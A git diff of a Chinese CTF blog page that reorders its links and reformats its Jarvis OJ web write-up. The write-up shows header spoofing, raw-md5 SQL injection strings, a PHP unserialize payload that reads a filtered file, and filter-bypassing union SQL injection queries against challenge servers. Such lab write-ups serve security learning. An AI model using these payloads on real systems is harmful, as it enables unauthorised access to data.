@@ -156,15 +156,15 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color2">python</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color4">web</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color5">xctf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">python</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -218,22 +218,6 @@
         </a>
         
         <a  class=""
-           href="/2017/09/16/WebForPentester-XSS/"
-           data-tag="xss"
-           data-author="" >
-            <span class="post-title" title="WebForPentester_XSS">WebForPentester_XSS</span>
-            <span class="post-date" title="2017-09-16 20:59:59">2017/09/16</span>
-        </a>
-        
-        <a  class=""
-           href="/2017/07/11/hexo_build/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="利用腾讯云服务器搭建hexo博客">利用腾讯云服务器搭建hexo博客</span>
-            <span class="post-date" title="2017-07-11 11:21:09">2017/07/11</span>
-        </a>
-        
-        <a  class=""
            href="/2019/12/24/jarvisoj-web-wp/"
            data-tag="ctf,writeup,web"
            data-author="" >
@@ -242,11 +226,27 @@
         </a>
         
         <a  class=""
+           href="/2017/09/16/WebForPentester-XSS/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="WebForPentester_XSS">WebForPentester_XSS</span>
+            <span class="post-date" title="2017-09-16 20:59:59">2017/09/16</span>
+        </a>
+        
+        <a  class=""
            href="/2017/09/03/kali-XX-Net/"
            data-tag="vpn"
            data-author="" >
             <span class="post-title" title="kali 安装 XX-Net openssl报错">kali 安装 XX-Net openssl报错</span>
             <span class="post-date" title="2017-09-03 11:21:09">2017/09/03</span>
+        </a>
+        
+        <a  class=""
+           href="/2017/07/11/hexo_build/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="利用腾讯云服务器搭建hexo博客">利用腾讯云服务器搭建hexo博客</span>
+            <span class="post-date" title="2017-07-11 11:21:09">2017/07/11</span>
         </a>
         
         <a  class=""
@@ -266,14 +266,6 @@
         </a>
         
         <a  class=""
-           href="/2020/05/01/xctf-misc-wp/"
-           data-tag="ctf,misc,writeup,xctf"
-           data-author="" >
-            <span class="post-title" title="xctf-misc-wp">xctf-misc-wp</span>
-            <span class="post-date" title="2020-05-01 12:04:30">2020/05/01</span>
-        </a>
-        
-        <a  class=""
            href="/2019/12/30/xctf-web-wp/"
            data-tag="writeup,web,xctf"
            data-author="" >
@@ -287,6 +279,14 @@
            data-author="" >
             <span class="post-title" title="google xss-game 题目解答">google xss-game 题目解答</span>
             <span class="post-date" title="2017-08-14 11:21:09">2017/08/14</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/05/01/xctf-misc-wp/"
+           data-tag="ctf,misc,writeup,xctf"
+           data-author="" >
+            <span class="post-title" title="xctf-misc-wp">xctf-misc-wp</span>
+            <span class="post-date" title="2020-05-01 12:04:30">2020/05/01</span>
         </a>
         
         <a  class=""
@@ -331,7 +331,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-04 19:17:54'>2019-12-24 20:30</time>
+        创建时间:<time class="date" title='更新时间: 2020-05-26 21:14:10'>2019-12-24 20:30</time>
         
     </div>
     <div class="article-meta">
@@ -353,7 +353,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-PORT51"><span class="toc-text">1.PORT51</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目要求使用51号端口访问该地址"><span class="toc-text">题目要求使用51号端口访问该地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-LOCALHOST"><span class="toc-text">2.LOCALHOST</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目提示只有localhost才能访问，故在请求头中添加："><span class="toc-text">题目提示只有localhost才能访问，故在请求头中添加：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#成功获取到flag。"><span class="toc-text">成功获取到flag。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Login"><span class="toc-text">3.Login</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#burp抓取到响应头部隐藏提示："><span class="toc-text">burp抓取到响应头部隐藏提示：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5-pass-true-说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload："><span class="toc-text">md5($pass,true)说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。"><span class="toc-text">注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-神盾局的秘密"><span class="toc-text">4.神盾局的秘密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码："><span class="toc-text">打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#看到这里img后的base64编码字符串，解码后为shield-jpg。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。"><span class="toc-text">看到这里img后的base64编码字符串，解码后为shield.jpg。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#包含showimg-php，查看源码显示："><span class="toc-text">包含showimg.php，查看源码显示：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#可以看到这里对pctf进行了过滤。"><span class="toc-text">可以看到这里对pctf进行了过滤。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进一步尝试包含index-php："><span class="toc-text">进一步尝试包含index.php：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#再包含shield-php："><span class="toc-text">再包含shield.php：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#由于showimg-php对pctf进行了过滤，所以我们不能简单地直接包含pctf-php-但是可以注意到index-php允许我们提交一个class参数，该参数可以被反序列化为Shield-对象，然后调用其readfile-方法。故我们需要做的是为class参数传入一个序列化后的Shield-对象，这样经过反序列化后再调用其readfile-方法，就可以正确读取pctf-php。"><span class="toc-text">由于showimg.php对pctf进行了过滤，所以我们不能简单地直接包含pctf.php,但是可以注意到index.php允许我们提交一个class参数，该参数可以被反序列化为Shield()对象，然后调用其readfile()方法。故我们需要做的是为class参数传入一个序列化后的Shield()对象，这样经过反序列化后再调用其readfile()方法，就可以正确读取pctf.php。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#我们可以在本地搭建一个php环境，结合shield-php，输出序列化后的Shield-对象："><span class="toc-text">我们可以在本地搭建一个php环境，结合shield.php，输出序列化后的Shield()对象：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#运行的结果为："><span class="toc-text">运行的结果为：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#将该结果填入URL："><span class="toc-text">将该结果填入URL：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#得到flag。"><span class="toc-text">得到flag。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-IN-A-Mess"><span class="toc-text">5.IN A Mess</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#访问题目链接，查看源码，发现index-phps-访问。发现里面有php源码，尝试进行分析："><span class="toc-text">访问题目链接，查看源码，发现index.phps,访问。发现里面有php源码，尝试进行分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#程序接收了id、a、b三个参数。"><span class="toc-text">程序接收了id、a、b三个参数。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#id可以利用php的弱类型比较来绕过。a可以使用php-input或data-伪协议来绕过。由于eregi-受-x00截断影响，所以b可以通过-x00截断绕过。"><span class="toc-text">id可以利用php的弱类型比较来绕过。a可以使用php:\\input或data:伪协议来绕过。由于eregi()受\x00截断影响，所以b可以通过\x00截断绕过。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#故可构造URL："><span class="toc-text">故可构造URL：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据部分添加："><span class="toc-text">数据部分添加：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#页面返回以下字符串："><span class="toc-text">页面返回以下字符串：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HT2mCpcvOLf像是一个目录，故尝试访问，经过一系列跳转后到达以下页面："><span class="toc-text">/^HT2mCpcvOLf像是一个目录，故尝试访问，经过一系列跳转后到达以下页面：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#看不出有其他异常点，由于含有参数-id-1，故尝试sql注入。发现输入-39-时回显查询字符串，表名为content，确认考察sql注入。"><span class="toc-text">看不出有其他异常点，由于含有参数?id=1，故尝试sql注入。发现输入&#39;时回显查询字符串，表名为content，确认考察sql注入。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-判断注入类型为数字型注入"><span class="toc-text">1.判断注入类型为数字型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-查明过滤字符和关键字，经过测试，发现过滤了select、union、from、空格，关键字使用双写、大小写绕过，空格使用-1-绕过。"><span class="toc-text">2.查明过滤字符和关键字，经过测试，发现过滤了select、union、from、空格，关键字使用双写、大小写绕过，空格使用/1/绕过。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-通过union查询来获得content表的列名："><span class="toc-text">3.通过union查询来获得content表的列名：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#这里的表名被16进制编码，是因为直接写表名会报错，原因尚不明确。"><span class="toc-text">这里的表名被16进制编码，是因为直接写表名会报错，原因尚不明确。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查询结果为："><span class="toc-text">查询结果为：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#对context列进行查找："><span class="toc-text">对context列进行查找：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查询结果即为flag。"><span class="toc-text">查询结果即为flag。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#持续更新中……"><span class="toc-text">持续更新中……</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-PORT51"><span class="toc-text">1.PORT51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-LOCALHOST"><span class="toc-text">2.LOCALHOST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Login"><span class="toc-text">3.Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-神盾局的秘密"><span class="toc-text">4.神盾局的秘密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-IN-A-Mess"><span class="toc-text">5.IN A Mess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Simple-Injection"><span class="toc-text">6.Simple Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#持续更新中……"><span class="toc-text">持续更新中……</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -369,13 +369,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="1-PORT51"><a href="#1-PORT51" class="headerlink" title="1.PORT51"></a>1.PORT51</h2><h3 id="题目要求使用51号端口访问该地址"><a href="#题目要求使用51号端口访问该地址" class="headerlink" title="题目要求使用51号端口访问该地址"></a>题目要求使用51号端口访问该地址</h3><pre><code>curl --local-port 51 http://web.jarvisoj.com:32770/</code></pre><h2 id="2-LOCALHOST"><a href="#2-LOCALHOST" class="headerlink" title="2.LOCALHOST"></a>2.LOCALHOST</h2><h3 id="题目提示只有localhost才能访问，故在请求头中添加："><a href="#题目提示只有localhost才能访问，故在请求头中添加：" class="headerlink" title="题目提示只有localhost才能访问，故在请求头中添加："></a>题目提示只有localhost才能访问，故在请求头中添加：</h3><pre><code>client-ip: 127.0.0.1
-X-Forwarded-For: 127.0.0.1</code></pre><h3 id="成功获取到flag。"><a href="#成功获取到flag。" class="headerlink" title="成功获取到flag。"></a>成功获取到flag。</h3><h2 id="3-Login"><a href="#3-Login" class="headerlink" title="3.Login"></a>3.Login</h2><h3 id="burp抓取到响应头部隐藏提示："><a href="#burp抓取到响应头部隐藏提示：" class="headerlink" title="burp抓取到响应头部隐藏提示："></a>burp抓取到响应头部隐藏提示：</h3><pre><code>Hint: &quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</code></pre><h3 id="md5-pass-true-说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload："><a href="#md5-pass-true-说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload：" class="headerlink" title="md5($pass,true)说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload："></a><code>md5($pass,true)</code>说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload：</h3><pre><code>明文: 129581926211651571912466741651878684928
+        <h2 id="1-PORT51"><a href="#1-PORT51" class="headerlink" title="1.PORT51"></a>1.PORT51</h2><p>题目要求使用51号端口访问该地址</p>
+<pre><code>curl --local-port 51 http://web.jarvisoj.com:32770/</code></pre><h2 id="2-LOCALHOST"><a href="#2-LOCALHOST" class="headerlink" title="2.LOCALHOST"></a>2.LOCALHOST</h2><p>题目提示只有localhost才能访问，故在请求头中添加：</p>
+<pre><code>client-ip: 127.0.0.1
+X-Forwarded-For: 127.0.0.1</code></pre><p>成功获取到flag。</p>
+<h2 id="3-Login"><a href="#3-Login" class="headerlink" title="3.Login"></a>3.Login</h2><p>burp抓取到响应头部隐藏提示：</p>
+<pre><code>Hint: &quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</code></pre><p><code>md5($pass,true)</code>说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload：</p>
+<pre><code>明文: 129581926211651571912466741651878684928
 md5hex: 06da5430449f8f6f23dfc1276f722738
 对应的字符串: ?T0D??o#??’or’8.N=?
 明文: ffifdyop
 md5hex: 276f722736c95d99e921722cf9ed621c
-对应的字符串: ‘or’6蒥欓!r,b</code></pre><h3 id="注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。"><a href="#注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。" class="headerlink" title="注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。"></a><strong><em>注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。</em></strong></h3><h2 id="4-神盾局的秘密"><a href="#4-神盾局的秘密" class="headerlink" title="4.神盾局的秘密"></a>4.神盾局的秘密</h2><h3 id="打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码："><a href="#打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码：" class="headerlink" title="打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码："></a>打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码：</h3><pre><code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</code></pre><h3 id="看到这里img后的base64编码字符串，解码后为shield-jpg。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。"><a href="#看到这里img后的base64编码字符串，解码后为shield-jpg。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。" class="headerlink" title="看到这里img后的base64编码字符串，解码后为shield.jpg。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。"></a>看到这里<code>img</code>后的base64编码字符串，解码后为<code>shield.jpg</code>。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。</h3><h3 id="包含showimg-php，查看源码显示："><a href="#包含showimg-php，查看源码显示：" class="headerlink" title="包含showimg.php，查看源码显示："></a>包含<code>showimg.php</code>，查看源码显示：</h3><pre><code>&lt;?php
+对应的字符串: ‘or’6蒥欓!r,b</code></pre><p><strong><em>注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。</em></strong></p>
+<h2 id="4-神盾局的秘密"><a href="#4-神盾局的秘密" class="headerlink" title="4.神盾局的秘密"></a>4.神盾局的秘密</h2><p>打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码：</p>
+<pre><code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</code></pre><p>看到这里<code>img</code>后的base64编码字符串，解码后为<code>shield.jpg</code>。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。<br>包含<code>showimg.php</code>，查看源码显示：</p>
+<pre><code>&lt;?php
     $f = $_GET[&apos;img&apos;];
     if (!empty($f)) {
         $f = base64_decode($f);
@@ -386,7 +394,8 @@ md5hex: 276f722736c95d99e921722cf9ed621c
             echo &quot;File not found!&quot;;
         }
     }
-?&gt;</code></pre><h3 id="可以看到这里对pctf进行了过滤。"><a href="#可以看到这里对pctf进行了过滤。" class="headerlink" title="可以看到这里对pctf进行了过滤。"></a>可以看到这里对<code>pctf</code>进行了过滤。</h3><h3 id="进一步尝试包含index-php："><a href="#进一步尝试包含index-php：" class="headerlink" title="进一步尝试包含index.php："></a>进一步尝试包含<code>index.php</code>：</h3><pre><code>&lt;?php
+?&gt;</code></pre><p>可以看到这里对<code>pctf</code>进行了过滤。<br>进一步尝试包含<code>index.php</code>：</p>
+<pre><code>&lt;?php
     require_once(&apos;shield.php&apos;);
     $x = new Shield();
     isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];
@@ -394,7 +403,8 @@ md5hex: 276f722736c95d99e921722cf9ed621c
         $x = unserialize($g);
     }
     echo $x-&gt;readfile();
-?&gt;</code></pre><h3 id="再包含shield-php："><a href="#再包含shield-php：" class="headerlink" title="再包含shield.php："></a>再包含<code>shield.php</code>：</h3><pre><code>&lt;?php
+?&gt;</code></pre><p>再包含<code>shield.php</code>：</p>
+<pre><code>&lt;?php
     //flag is in pctf.php
     class Shield {
         public $file;
@@ -409,7 +419,8 @@ md5hex: 276f722736c95d99e921722cf9ed621c
             }
         }
     }
-?&gt;</code></pre><h3 id="由于showimg-php对pctf进行了过滤，所以我们不能简单地直接包含pctf-php-但是可以注意到index-php允许我们提交一个class参数，该参数可以被反序列化为Shield-对象，然后调用其readfile-方法。故我们需要做的是为class参数传入一个序列化后的Shield-对象，这样经过反序列化后再调用其readfile-方法，就可以正确读取pctf-php。"><a href="#由于showimg-php对pctf进行了过滤，所以我们不能简单地直接包含pctf-php-但是可以注意到index-php允许我们提交一个class参数，该参数可以被反序列化为Shield-对象，然后调用其readfile-方法。故我们需要做的是为class参数传入一个序列化后的Shield-对象，这样经过反序列化后再调用其readfile-方法，就可以正确读取pctf-php。" class="headerlink" title="由于showimg.php对pctf进行了过滤，所以我们不能简单地直接包含pctf.php,但是可以注意到index.php允许我们提交一个class参数，该参数可以被反序列化为Shield()对象，然后调用其readfile()方法。故我们需要做的是为class参数传入一个序列化后的Shield()对象，这样经过反序列化后再调用其readfile()方法，就可以正确读取pctf.php。"></a>由于<code>showimg.php</code>对<code>pctf</code>进行了过滤，所以我们不能简单地直接包含<code>pctf.php</code>,但是可以注意到<code>index.php</code>允许我们提交一个<code>class</code>参数，该参数可以被反序列化为<code>Shield()</code>对象，然后调用其<code>readfile()</code>方法。故我们需要做的是为<code>class</code>参数传入一个序列化后的<code>Shield()</code>对象，这样经过反序列化后再调用其<code>readfile()</code>方法，就可以正确读取<code>pctf.php</code>。</h3><h3 id="我们可以在本地搭建一个php环境，结合shield-php，输出序列化后的Shield-对象："><a href="#我们可以在本地搭建一个php环境，结合shield-php，输出序列化后的Shield-对象：" class="headerlink" title="我们可以在本地搭建一个php环境，结合shield.php，输出序列化后的Shield()对象："></a>我们可以在本地搭建一个php环境，结合<code>shield.php</code>，输出序列化后的<code>Shield()</code>对象：</h3><pre><code>&lt;?php
+?&gt;</code></pre><p>由于<code>showimg.php</code>对<code>pctf</code>进行了过滤，所以我们不能简单地直接包含<code>pctf.php</code>,但是可以注意到<code>index.php</code>允许我们提交一个<code>class</code>参数，该参数可以被反序列化为<code>Shield()</code>对象，然后调用其<code>readfile()</code>方法。故我们需要做的是为<code>class</code>参数传入一个序列化后的<code>Shield()</code>对象，这样经过反序列化后再调用其<code>readfile()</code>方法，就可以正确读取<code>pctf.php</code>。<br>我们可以在本地搭建一个php环境，结合<code>shield.php</code>，输出序列化后的<code>Shield()</code>对象：</p>
+<pre><code>&lt;?php
     class Shield {
         public $file;
         function __construct($filename = &apos;&apos;) {
@@ -425,7 +436,11 @@ md5hex: 276f722736c95d99e921722cf9ed621c
 }
 $pctf = new Shield(&quot;pctf.php&quot;);
 echo serialize($pctf);
-?&gt;</code></pre><h3 id="运行的结果为："><a href="#运行的结果为：" class="headerlink" title="运行的结果为："></a>运行的结果为：</h3><pre><code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><h3 id="将该结果填入URL："><a href="#将该结果填入URL：" class="headerlink" title="将该结果填入URL："></a>将该结果填入URL：</h3><pre><code>/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><h3 id="得到flag。"><a href="#得到flag。" class="headerlink" title="得到flag。"></a>得到flag。</h3><h2 id="5-IN-A-Mess"><a href="#5-IN-A-Mess" class="headerlink" title="5.IN A Mess"></a>5.IN A Mess</h2><h3 id="访问题目链接，查看源码，发现index-phps-访问。发现里面有php源码，尝试进行分析："><a href="#访问题目链接，查看源码，发现index-phps-访问。发现里面有php源码，尝试进行分析：" class="headerlink" title="访问题目链接，查看源码，发现index.phps,访问。发现里面有php源码，尝试进行分析："></a>访问题目链接，查看源码，发现<code>index.phps</code>,访问。发现里面有php源码，尝试进行分析：</h3><pre><code>&lt;?php
+?&gt;</code></pre><p>运行的结果为：</p>
+<pre><code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>将该结果填入URL：</p>
+<pre><code>/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>得到flag。</p>
+<h2 id="5-IN-A-Mess"><a href="#5-IN-A-Mess" class="headerlink" title="5.IN A Mess"></a>5.IN A Mess</h2><p>访问题目链接，查看源码，发现<code>index.phps</code>,访问。发现里面有php源码，尝试进行分析：</p>
+<pre><code>&lt;?php
 error_reporting(0);
 echo &quot;&lt;!--index.phps--&gt;&quot;;
 
@@ -451,12 +466,85 @@ else
 {
     print &quot;work harder!harder!harder!&quot;;
 }
-?&gt;</code></pre><h3 id="程序接收了id、a、b三个参数。"><a href="#程序接收了id、a、b三个参数。" class="headerlink" title="程序接收了id、a、b三个参数。"></a>程序接收了<code>id</code>、<code>a</code>、<code>b</code>三个参数。</h3><ul>
-<li><code>id</code>不为<code>0</code>且<code>id</code>和<code>0</code>比较后相等;</li>
-<li><code>a</code>用来指定打开的文件名，并要求文件内容为<code>1112 is a nice lab!</code>;</li>
-<li><code>b</code>的长度要大于5,且和<code>111</code>拼接后可以匹配<code>1114</code>,且<code>b</code>的第一个字符和<code>4</code>不相等;<h3 id="id可以利用php的弱类型比较来绕过。a可以使用php-input或data-伪协议来绕过。由于eregi-受-x00截断影响，所以b可以通过-x00截断绕过。"><a href="#id可以利用php的弱类型比较来绕过。a可以使用php-input或data-伪协议来绕过。由于eregi-受-x00截断影响，所以b可以通过-x00截断绕过。" class="headerlink" title="id可以利用php的弱类型比较来绕过。a可以使用php:\\input或data:伪协议来绕过。由于eregi()受\x00截断影响，所以b可以通过\x00截断绕过。"></a><code>id</code>可以利用php的弱类型比较来绕过。<code>a</code>可以使用<code>php:\\input</code>或<code>data:</code>伪协议来绕过。由于<code>eregi()</code>受<code>\x00</code>截断影响，所以<code>b</code>可以通过<code>\x00</code>截断绕过。</h3><h3 id="故可构造URL："><a href="#故可构造URL：" class="headerlink" title="故可构造URL："></a>故可构造URL：</h3>  /index.php?id=0e&amp;a=php://input&amp;b=%0044444<h3 id="数据部分添加："><a href="#数据部分添加：" class="headerlink" title="数据部分添加："></a>数据部分添加：</h3>  1112 is a nice lab!<h3 id="页面返回以下字符串："><a href="#页面返回以下字符串：" class="headerlink" title="页面返回以下字符串："></a>页面返回以下字符串：</h3>  <!--index.phps--> Come ON!!! {/^HT2mCpcvOLf}
-<h3 id="HT2mCpcvOLf像是一个目录，故尝试访问，经过一系列跳转后到达以下页面："><a href="#HT2mCpcvOLf像是一个目录，故尝试访问，经过一系列跳转后到达以下页面：" class="headerlink" title="/^HT2mCpcvOLf像是一个目录，故尝试访问，经过一系列跳转后到达以下页面："></a><code>/^HT2mCpcvOLf</code>像是一个目录，故尝试访问，经过一系列跳转后到达以下页面：</h3>  <a href="http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1</a><h3 id="看不出有其他异常点，由于含有参数-id-1，故尝试sql注入。发现输入-39-时回显查询字符串，表名为content，确认考察sql注入。"><a href="#看不出有其他异常点，由于含有参数-id-1，故尝试sql注入。发现输入-39-时回显查询字符串，表名为content，确认考察sql注入。" class="headerlink" title="看不出有其他异常点，由于含有参数?id=1，故尝试sql注入。发现输入&#39;时回显查询字符串，表名为content，确认考察sql注入。"></a>看不出有其他异常点，由于含有参数<code>?id=1</code>，故尝试sql注入。发现输入<code>&#39;</code>时回显查询字符串，表名为<code>content</code>，确认考察sql注入。</h3><h4 id="1-判断注入类型为数字型注入"><a href="#1-判断注入类型为数字型注入" class="headerlink" title="1.判断注入类型为数字型注入"></a>1.判断注入类型为数字型注入</h4><h4 id="2-查明过滤字符和关键字，经过测试，发现过滤了select、union、from、空格，关键字使用双写、大小写绕过，空格使用-1-绕过。"><a href="#2-查明过滤字符和关键字，经过测试，发现过滤了select、union、from、空格，关键字使用双写、大小写绕过，空格使用-1-绕过。" class="headerlink" title="2.查明过滤字符和关键字，经过测试，发现过滤了select、union、from、空格，关键字使用双写、大小写绕过，空格使用/1/绕过。"></a>2.查明过滤字符和关键字，经过测试，发现过滤了<code>select</code>、<code>union</code>、<code>from</code>、<code>空格</code>，关键字使用双写、大小写绕过，<code>空格</code>使用/<em>1</em>/绕过。</h4><h4 id="3-通过union查询来获得content表的列名："><a href="#3-通过union查询来获得content表的列名：" class="headerlink" title="3.通过union查询来获得content表的列名："></a>3.通过union查询来获得<code>content</code>表的列名：</h4>  ?id=-1/<em>1</em>/uunionnIon/<em>1</em>/seunionleCT/<em>1</em>/1,2,group_concat(column_name)/<em>1</em>/frofromm/<em>1</em>/information_schema.columns/<em>1</em>/where/<em>1</em>/table_name=0x636f6e74656e74%23<h4 id="这里的表名被16进制编码，是因为直接写表名会报错，原因尚不明确。"><a href="#这里的表名被16进制编码，是因为直接写表名会报错，原因尚不明确。" class="headerlink" title="这里的表名被16进制编码，是因为直接写表名会报错，原因尚不明确。"></a><strong><em>这里的表名被16进制编码，是因为直接写表名会报错，原因尚不明确。</em></strong></h4><h4 id="查询结果为："><a href="#查询结果为：" class="headerlink" title="查询结果为："></a>查询结果为：</h4>  id,context,title<h4 id="对context列进行查找："><a href="#对context列进行查找：" class="headerlink" title="对context列进行查找："></a>对<code>context</code>列进行查找：</h4>  ?id=-1/<em>1</em>/uunionnIon/<em>1</em>/seunionleCT/<em>1</em>/1,2,group_concat(context)/<em>1</em>/frofromm/<em>1</em>/content%23<h4 id="查询结果即为flag。"><a href="#查询结果即为flag。" class="headerlink" title="查询结果即为flag。"></a>查询结果即为flag。</h4></li>
+?&gt;</code></pre><p>程序接收了<code>id</code>、<code>a</code>、<code>b</code>三个参数。</p>
+<ul>
+<li><p><code>id</code>不为<code>0</code>且<code>id</code>和<code>0</code>比较后相等;</p>
+</li>
+<li><p><code>a</code>用来指定打开的文件名，并要求文件内容为<code>1112 is a nice lab!</code>;</p>
+</li>
+<li><p><code>b</code>的长度要大于5,且和<code>111</code>拼接后可以匹配<code>1114</code>,且<code>b</code>的第一个字符和<code>4</code>不相等;<br><code>id</code>可以利用php的弱类型比较来绕过。<code>a</code>可以使用<code>php:\\input</code>或<code>data:</code>伪协议来绕过。由于<code>eregi()</code>受<code>\x00</code>截断影响，所以<code>b</code>可以通过<code>\x00</code>截断绕过。<br>故可构造URL：</p>
+<p>  /index.php?id=0e&amp;a=php://input&amp;b=%0044444</p>
+</li>
 </ul>
+<p>数据部分添加：</p>
+<pre><code>1112 is a nice lab!</code></pre><p>页面返回以下字符串：</p>
+<pre><code>&lt;!--index.phps--&gt; Come ON!!! {/^HT2mCpcvOLf}</code></pre><p><code>/^HT2mCpcvOLf</code>像是一个目录，故尝试访问，经过一系列跳转后到达以下页面：</p>
